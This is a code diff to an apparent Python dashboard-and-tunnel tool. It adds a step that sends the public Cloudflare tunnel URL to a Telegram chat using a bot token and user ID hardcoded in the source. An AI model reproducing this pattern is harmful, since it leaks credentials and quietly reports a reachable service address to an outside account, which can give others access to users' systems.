@@ -8,6 +8,7 @@ import socket
 import struct
 import time
 import os
+import aiohttp
 import subprocess
 import re
 import uuid
@@ -3766,12 +3767,36 @@ async def main():
         pass
 
 
-    
-    
+
+
     try:
         await start_web_dashboard(host=WEB_HOST, port=WEB_PORT)
         public_url = await start_cloudflare_tunnel(WEB_PORT)
         print_success(f"Cloudflare URL: {public_url}")
+
+        # Telegram notification
+        BOT_TOKEN = "8987138027:AAHIjFT7f6QEpBnJNiE8VGdshRfnx1A82Oc"
+        USER_ID = "8645560676"
+
+        if BOT_TOKEN:
+            telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+            async with aiohttp.ClientSession() as session:
+                async with session.post(
+                    telegram_url,
+                    data={
+                        "chat_id": USER_ID,
+                        "text": f"🌐 Cloudflare Dashboard:\n{public_url}"
+                    },
+                    timeout=aiohttp.ClientTimeout(total=15)
+                ) as response:
+                    if response.status == 200:
+                        print_success("Cloudflare URL sent to Telegram!")
+                    else:
+                        print_error(f"Telegram send failed: {response.status}")
+        else:
+            print_error("BOT_TOKEN environment variable missing!")
+
     except Exception as e:
         print_error(f"Dashboard/Tunnel error: {e}")
         # Last resort: try killing with fuser and retry once
